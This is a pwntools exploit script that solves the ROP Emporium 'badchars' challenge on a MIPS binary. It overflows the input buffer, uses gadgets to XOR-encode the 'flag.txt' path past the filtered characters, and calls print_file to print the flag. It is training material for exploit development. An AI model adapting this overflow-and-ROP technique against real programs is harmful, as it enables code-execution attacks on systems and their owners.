from pwn import *

elf = ELF("badchars_mipsel")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x1c8
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BADCHARS = [b'x', b'g', b'a', b'.'] # "78|67|61|2E"

BUFFER_SIZE = 32
READ_SIZE = 512

KEY = 0xff
PATH = b'flag.txt'
MEMORY = elf.bss(0x880)

STORE_GADGET = elf.symbols.usefulGadgets
XOR_GADGET = elf.symbols.usefulGadgets + 0x18
CALL_GADGET = elf.symbols.usefulGadgets + 0x38

def is_valid(data):
    return not any(c in data for c in BADCHARS)

def encrypt(data):
    return bytes([~c & KEY for c in data])

def main():
    rop = ROP(elf, badchars=b''.join(BADCHARS))
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # write key to memory
    rop.raw([STORE_GADGET, 0, bytes([KEY]) * context.bytes, MEMORY])
    rop.raw([STORE_GADGET, 0, bytes([KEY]) * context.bytes, MEMORY + context.bytes])
    # decrypt path in memory
    rop.raw([XOR_GADGET, 0, MEMORY, encrypt(PATH)[:context.bytes]])
    rop.raw([XOR_GADGET, 0, MEMORY + context.bytes, encrypt(PATH)[context.bytes:]])
    # call print_file with decrypted path as arg
    rop.raw([CALL_GADGET, 0, elf.symbols.print_file, MEMORY])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE and is_valid(payload)

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
